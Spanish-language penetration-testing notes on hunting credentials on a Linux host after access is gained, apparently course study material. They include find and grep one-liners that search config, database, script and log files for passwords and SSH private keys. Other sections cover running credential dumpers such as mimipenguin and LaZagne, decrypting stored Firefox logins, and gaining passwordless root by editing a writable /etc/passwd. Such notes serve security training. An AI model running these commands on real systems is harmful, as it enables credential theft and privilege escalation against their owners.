
###BUSCAR CONTRASEÑAS EN LINUX
Las contraseñas pueden encontrarse en archivos, memoria, y key rings. El segundo hace referencia a registros, procesos y el ultimo a creds almacenadas en navegador.
En linux todo es un archivo, por lo cual es importante enumerar los de configuracion, base de datos (cronjobs) y de texto para encontrar algo.

	##Archivos de CONFiguracion
	for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
	#De esta forma buscamos archivos tipo .conf .config, etc gracias a pasarle el parametro al find
	for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
	#En cada archivo .cnf se busca la palabra user password o pass

	##Archivos BASE DE DATOS
	for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
	#Se busca los archivos .sql, .ddbb, etc

	##Archivos de TXT
	find /home/* -type f -name "*.txt" -o ! -name "*.*"
	#Muchas veces no siempre los archivos de texto poseen el .txt. Por este motivo se debe buscar la extension y archivos sin extencion.

	##Archivos SCRIPT
	for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
	#Al igual que lo anterior se buscan archivos con extencion segun lo que buscamos. En este caso: .py, .go, etc

	##CRONJOB
	Son ejecuciones de comandos programados y se encuentran en /etc/crontab. Algunos script requieren contraseñas para ejecutarese y puede haber alguna en estos archivos.
	Puede haber cron.daily, etc dependiendo la frecuencia.
	Distros debian: /etc/cron.d

	##CLAVES SSH
	grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
	grep -rnw "ssh-rsa" /home/* 2>/dev/null | grep ":1"
	#Dado que las claves ssh pueden nombrarse de distinta forma, es conveniente intentar buscar por el comienzo de la private que es siempre igual.

	##Archivo HISTORIAL BASH
	El archivo bash history es el historial de todos los comandos utilizados en la terminal bash. Se puede catear

	##REGISTROS
	Los archivos de registros se almacenan en /var/log/*. Aca se puede encontrar info de los registros.
	for i in $(ls /var/log/* 2>/dev/null);do GREP=$(grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null); if [[ $GREP ]];then echo -e "\n#### Log file: " $i; grep "accepted\|session opened\|session closed\|failure\|failed\|ssh\|password changed\|new user\|delete user\|sudo\|COMMAND\=\|logs" $i 2>/dev/null;fi;done

	##Archivos de MEMORIA y CACHE
	Muchas veces las credenciales para reutilizarlas se almacenan en archivos que pueden ser leidos. Para ello una herramienta llamada mimipenguin puede sernos de utilidad
	Requiere privilegios root!

	sudo python3 mimipenguin.py
	sudo bash mimipenguin.sh 

	Lazagne tambien puede servirnos en Linux
	sudo python2.7 laZagne.py all

	##NAVEGADORES
	Las credenciales de FIREFOX son almacenadas en logins.json encriptadas.
	ls -l .mozilla/firefox/ | grep default 
	#Busco carpeta contenedora de archvio .json
	cat .mozilla/firefox/1bplpd86.default-release/logins.json | jq .
	#Leo el interior del archivo buscado

	python3.9 firefox_decrypt.py
	#Con Firefoxdecrypt podemos desencriptar estas contraseñas.

	python3 laZagne.py browsers
	#Lazagne tambien tiene su version para browsers

###AUTENTICACION
La autenticacion en Linux se realiza con los modulos PAM. Adminitra informacion de usuario, autenticacion, sesiones, contraseñas actuales y antiguas.

	##/etc/passwd
	Cada entrada en el archivo corresponde a un usuario. Esta compuesto por campos separados mediante ":"
	
	usr : password : UID :: GUID : nombre completo : directorio : shell
	#Si en el campo de la contraseña se encuentra un X quiere decir que el hash es almacenado en /etc/shadow
	#Si el posible editar el etc/passwd y se borra la x de root, podriamos ejecutar todo como root sin necesidad de password.
	
	##/etc/shadow
	No maneja las contraseñas sino que solo almacena el hash. En el caso de que no haya entrada en este archivo para un usr que se encuentra en passwd, este usuario se considera invalido
	Solo puede ser leido y manipulado con acceso root.
	
